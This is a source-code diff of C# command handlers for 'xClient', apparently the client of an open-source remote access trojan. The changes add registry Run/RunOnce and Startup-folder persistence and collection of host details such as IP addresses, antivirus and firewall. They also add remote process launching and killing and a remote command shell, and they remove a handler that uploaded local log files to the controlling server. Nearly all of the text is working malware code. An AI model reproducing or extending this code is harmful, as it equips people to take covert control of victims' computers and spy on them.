@@ -2,10 +2,10 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Threading;
 using System.Windows.Forms;
 using Microsoft.Win32;
-using xClient.Core.Helper;
+using xClient.Core.Information;
+using xClient.Core.RemoteShell;
 
 namespace xClient.Core.Commands
 {
@@ -15,58 +15,6 @@ namespace xClient.Core.Commands
         public static void HandleDrives(Packets.ServerPackets.Drives command, Client client)
         {
             new Packets.ClientPackets.DrivesResponse(Environment.GetLogicalDrives()).Execute(client);
-        }
-
-        public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
-        {
-            new Thread(() =>
-            {
-                try
-                {
-                    int index = 1;
-                    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
-
-                    if (!Directory.Exists(path))
-                    {
-                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
-                        return;
-                    }
-
-                    FileInfo[] iFiles = new DirectoryInfo(path).GetFiles();
-
-                    if (iFiles.Length == 0)
-                    {
-                        new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
-                        return;
-                    }
-
-                    foreach (FileInfo file in iFiles)
-                    {
-                        FileSplit srcFile = new FileSplit(file.FullName);
-
-                        if (srcFile.MaxBlocks < 0)
-                            new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
-
-                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
-                        {
-                            byte[] block;
-                            if (srcFile.ReadBlock(currentBlock, out block))
-                            {
-                                new Packets.ClientPackets.GetLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
-                                //Thread.Sleep(200);
-                            }
-                            else
-                                new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
-                        }
-
-                        index++;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
-                }
-            }).Start();
         }
 
         public static void HandleAction(Packets.ServerPackets.Action command, Client client)
@@ -116,7 +64,10 @@ namespace xClient.Core.Commands
                     if (key != null)
                     {
                         foreach (var k in key.GetValueNames())
+                        {
+                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                             startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 0);
+                        }
                     }
                 }
                 using (
@@ -126,7 +77,10 @@ namespace xClient.Core.Commands
                     if (key != null)
                     {
                         foreach (var k in key.GetValueNames())
+                        {
+                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                             startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 1);
+                        }
                     }
                 }
                 using (
@@ -136,7 +90,10 @@ namespace xClient.Core.Commands
                     if (key != null)
                     {
                         foreach (var k in key.GetValueNames())
+                        {
+                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                             startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 2);
+                        }
                     }
                 }
                 using (
@@ -146,31 +103,54 @@ namespace xClient.Core.Commands
                     if (key != null)
                     {
                         foreach (var k in key.GetValueNames())
+                        {
+                            if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
                             startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 3);
+                        }
                     }
                 }
-                if (
-                    Directory.Exists(
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+                if (OSInfo.Bits == 64)
                 {
-                    var files =
-                        new DirectoryInfo(
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
-                    foreach (var file in files)
-                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 4);
+                    using (
+                        var key =
+                            Registry.LocalMachine.OpenSubKey(
+                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                false))
+                    {
+                        if (key != null)
+                        {
+                            foreach (var k in key.GetValueNames())
+                            {
+                                if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
+                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 4);
+                            }
+                        }
+                    }
+                    using (
+                        var key =
+                            Registry.LocalMachine.OpenSubKey(
+                                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+                                false))
+                    {
+                        if (key != null)
+                        {
+                            foreach (var k in key.GetValueNames())
+                            {
+                                if (string.IsNullOrEmpty(k) || key.GetValue(k) == null) continue;
+                                startupItems.Add(string.Format("{0}||{1}", k, key.GetValue(k)), 5);
+                            }
+                        }
+                    }
                 }
-                if (
-                    Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                        "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                 {
                     var files =
-                        new DirectoryInfo(
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
+                        new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
                     foreach (var file in files)
-                        startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 5);
+                    {
+                        if (file.Name != "desktop.ini")
+                            startupItems.Add(string.Format("{0}||{1}", file.Name, file.FullName), 6);
+                    }
                 }
 
                 new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
@@ -193,10 +173,11 @@ namespace xClient.Core.Commands
                                 Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                     true))
                         {
-                            if (key == null) throw new Exception();
+                            if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
+                            key.Close();
                         }
                         break;
                     case 1:
@@ -205,10 +186,11 @@ namespace xClient.Core.Commands
                                 Registry.LocalMachine.OpenSubKey(
                                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                         {
-                            if (key == null) throw new Exception();
+                            if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
+                            key.Close();
                         }
                         break;
                     case 2:
@@ -217,10 +199,11 @@ namespace xClient.Core.Commands
                                 Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                                     true))
                         {
-                            if (key == null) throw new Exception();
+                            if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
+                            key.Close();
                         }
                         break;
                     case 3:
@@ -229,23 +212,61 @@ namespace xClient.Core.Commands
                                 Registry.CurrentUser.OpenSubKey(
                                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
                         {
-                            if (key == null) throw new Exception();
+                            if (key == null) throw new Exception("Registry key does not exist");
                             if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
                                 command.Path = "\"" + command.Path + "\"";
                             key.SetValue(command.Name, command.Path);
+                            key.Close();
                         }
                         break;
                     case 4:
-                        if (
-                            !Directory.Exists(
-                                Path.Combine(
-                                    Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
-                            throw new Exception();
+                        if (OSInfo.Bits != 64)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
 
-                        string lnkPath =
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey(
+                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        {
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
+                                command.Path = "\"" + command.Path + "\"";
+                            key.SetValue(command.Name, command.Path);
+                            key.Close();
+                        }
+                        break;
+                    case 5:
+                        if (OSInfo.Bits != 64)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey(
+                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        {
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            if (!command.Path.StartsWith("\"") && !command.Path.EndsWith("\""))
+                                command.Path = "\"" + command.Path + "\"";
+                            key.SetValue(command.Name, command.Path);
+                            key.Close();
+                        }
+                        break;
+                    case 6:
+                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
+                        {
+                            try
+                            {
+                                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+                            }
+                            catch (Exception ex)
+                            {
+                                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+                                return;
+                            }
+                        }
+
+                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
+                            command.Name + ".url");
 
                         using (var writer = new StreamWriter(lnkPath, false))
                         {
@@ -256,32 +277,212 @@ namespace xClient.Core.Commands
                             writer.Flush();
                         }
                         break;
-                    case 5:
-                        if (
-                            !Directory.Exists(
-                                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                    "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
-                            throw new Exception();
+                }
+            }
+            catch (Exception ex)
+            {
+                new Packets.ClientPackets.Status(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
+            }
+        }
 
-                        string lnkPath2 =
-                            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                                "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + command.Name + ".url");
-
-                        using (var writer = new StreamWriter(lnkPath2, false))
+        public static void HandleAddRemoveStartupItem(Packets.ServerPackets.RemoveStartupItem command, Client client )
+        {
+            try
+            {
+                switch (command.Type)
+                {
+                    case 0:
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
                         {
-                            writer.WriteLine("[InternetShortcut]");
-                            writer.WriteLine("URL=file:///" + command.Path);
-                            writer.WriteLine("IconIndex=0");
-                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
-                            writer.Flush();
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            key.DeleteValue(command.Name, true);
+                            key.Close();
                         }
+                        break;
+                    case 2:
+                        using (
+                            var key =
+                                Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                                    true))
+                        {
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            key.DeleteValue(command.Name, true);
+                            key.Close();
+                        }
+                        break;
+                    case 3:
+                        using (
+                            var key =
+                                Registry.CurrentUser.OpenSubKey(
+                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        {
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            key.DeleteValue(command.Name, true);
+                            key.Close();
+                        }
+                        break;
+                    case 4:
+                        if (OSInfo.Bits != 64)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey(
+                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        {
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            key.DeleteValue(command.Name, true);
+                            key.Close();
+                        }
+                        break;
+                    case 5:
+                        if (OSInfo.Bits != 64)
+                            throw new NotSupportedException("Only on 64-bit systems supported");
+
+                        using (
+                            var key =
+                                Registry.LocalMachine.OpenSubKey(
+                                    "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true))
+                        {
+                            if (key == null) throw new Exception("Registry key does not exist");
+                            key.DeleteValue(command.Name, true);
+                            key.Close();
+                        }
+                        break;
+                    case 6:
+                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
+
+                        if (!File.Exists(lnkPath))
+                            throw new IOException("File does not exist");
+
+                        File.Delete(lnkPath);
                         break;
                 }
             }
+            catch (Exception ex)
+            {
+                new Packets.ClientPackets.Status(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
+            }
+        }
+
+        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
+        {
+            try
+            {
+                string[] infoCollection = new string[]
+                {
+                    "Processor (CPU)",
+                    SystemCore.GetCpu(),
+                    "Memory (RAM)",
+                    string.Format("{0} MB", SystemCore.GetRam()),
+                    "Video Card (GPU)",
+                    SystemCore.GetGpu(),
+                    "Username",
+                    SystemCore.GetUsername(),
+                    "PC Name",
+                    SystemCore.GetPcName(),
+                    "Uptime",
+                    SystemCore.GetUptime(),
+                    "MAC Address",
+                    SystemCore.GetMacAddress(),
+                    "LAN IP Address",
+                    SystemCore.GetLanIp(),
+                    "WAN IP Address",
+                    SystemCore.WanIp,
+                    "Antivirus",
+                    SystemCore.GetAntivirus(),
+                    "Firewall",
+                    SystemCore.GetFirewall()
+                };
+
+                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
+            }
             catch
             {
-                new Packets.ClientPackets.Status("Adding Autostart Item failed!").Execute(client);
             }
+        }
+
+        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
+        {
+            Process[] pList = Process.GetProcesses();
+            string[] processes = new string[pList.Length];
+            int[] ids = new int[pList.Length];
+            string[] titles = new string[pList.Length];
+
+            int i = 0;
+            foreach (Process p in pList)
+            {
+                processes[i] = p.ProcessName + ".exe";
+                ids[i] = p.Id;
+                titles[i] = p.MainWindowTitle;
+                i++;
+            }
+
+            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
+        }
+
+        public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
+        {
+            if (string.IsNullOrEmpty(command.Processname))
+            {
+                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+                return;
+            }
+
+            try
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    UseShellExecute = true,
+                    FileName = command.Processname
+                };
+                Process.Start(startInfo);
+            }
+            catch
+            {
+                new Packets.ClientPackets.Status("Process could not be started!").Execute(client);
+            }
+            finally
+            {
+                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+            }
+        }
+
+        public static void HandleKillProcess(Packets.ServerPackets.KillProcess command, Client client)
+        {
+            try
+            {
+                Process.GetProcessById(command.PID).Kill();
+            }
+            catch
+            {
+            }
+            finally
+            {
+                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
+            }
+        }
+
+        public static void HandleShellCommand(Packets.ServerPackets.ShellCommand command, Client client)
+        {
+            string input = command.Command;
+
+            if (_shell == null && input == "exit") return;
+            if (_shell == null) _shell = new Shell();
+
+            if (input == "exit")
+                CloseShell();
+            else
+                _shell.ExecuteCommand(input);
+        }
+
+        public static void CloseShell()
+        {
+            if (_shell != null)
+                _shell.Dispose();
         }
     }
 }
